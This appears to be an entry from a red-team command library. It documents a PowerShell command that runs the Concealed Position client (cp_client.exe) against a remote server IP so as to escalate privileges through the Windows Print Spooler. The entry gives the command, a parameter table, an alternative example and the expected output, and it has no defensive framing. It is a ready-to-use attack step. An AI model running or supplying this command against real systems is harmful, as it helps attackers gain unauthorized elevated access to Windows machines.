---
id: 0bb82f30-d3ce-4179-a09e-1299a5528d78
name: cp-client-create-with-remote-ip-and-name
type: command
executor: powershell
data: cp_client.exe -r 10.0.0.9 -n ACIDDAMAGE -e ACIDDAMAGE
output: null
created_at: '2023-04-06T03:56:29.907658+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Windows
tags:
  - privilege-escalation
  - spooler
verified: true
validated: true
---

# cp-client-create-with-remote-ip-and-name

## Command

```powershell
cp_client.exe -r 10.0.0.9 -n ACIDDAMAGE -e ACIDDAMAGE
```

## Description

Creates a Concealed Position client configured to connect to a remote server IP with specified names for exploitation via Print Spooler.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| -r | Remote server IP address (e.g., 10.0.0.9) | Yes |
| -n | Client name (e.g., ACIDDAMAGE) | Yes |
| -e | Execution name (e.g., ACIDDAMAGE) | Yes |

## Examples

### Basic Usage

```powershell
cp_client.exe -r 10.0.0.9 -n ACIDDAMAGE -e ACIDDAMAGE
```

### Advanced Usage

Different IP: `cp_client.exe -r 192.168.1.100 -n CustomClient -e CustomExec`

## Expected Output

Confirmation like "Client created and configured." Check for client files in the working directory.

## Related

- [[procedures/Printer-Spooler-Service-Elevation-of-Privilege]]
